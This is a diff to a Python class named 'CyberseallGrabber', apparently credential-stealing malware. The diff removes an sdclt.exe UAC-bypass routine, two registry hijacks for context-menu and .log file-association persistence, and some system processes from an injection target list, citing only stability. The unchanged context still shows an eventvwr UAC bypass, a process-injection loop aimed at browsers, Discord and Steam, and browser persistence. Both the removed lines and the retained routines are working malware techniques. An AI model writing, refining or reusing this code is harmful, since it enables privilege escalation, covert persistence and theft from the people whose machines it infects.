@@ -331,24 +331,8 @@ class CyberseallGrabber:
             pass
 
     def uac_bypass_sdclt(self):
-        try:
-            key_path = r"Software\Classes\Folder\shell\open\command"
-            
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
-                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.install_path)
-                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-                winreg.CloseKey(key)
-                
-                subprocess.Popen(['sdclt.exe', '/KickOffElev'], shell=False,
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                
-                time.sleep(2)
-                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
-            except:
-                pass
-        except:
-            pass
+        # REMOVED: This function was manipulating folder associations which could damage Windows Explorer
+        pass
 
     def uac_bypass_eventvwr(self):
         try:
@@ -509,8 +493,8 @@ def inject_into_process(target_process_name):
 
 def start_injection_loop():
     target_processes = [
-        "notepad.exe", "explorer.exe", "chrome.exe", "firefox.exe", 
-        "discord.exe", "steam.exe", "winlogon.exe", "dwm.exe"
+        "notepad.exe", "chrome.exe", "firefox.exe", 
+        "discord.exe", "steam.exe"
     ]
     
     while True:
@@ -760,12 +744,7 @@ while ($true) {{
                     except:
                         pass
             
-            try:
-                shell_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\*\shell\SecurityScan\command")
-                winreg.SetValueEx(shell_key, "", 0, winreg.REG_SZ, f'"{self.install_path}"')
-                winreg.CloseKey(shell_key)
-            except:
-                pass
+            # REMOVED: Context menu manipulation that could interfere with file operations
                 
         except:
             pass
@@ -937,12 +916,7 @@ Loop
             
             self.install_browser_persistence()
             
-            try:
-                assoc_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\.log\shell\open\command")
-                winreg.SetValueEx(assoc_key, "", 0, winreg.REG_SZ, f'"{self.install_path}" "%1"')
-                winreg.CloseKey(assoc_key)
-            except:
-                pass
+            # REMOVED: File association manipulation that could interfere with system functionality
                 
         except:
             pass
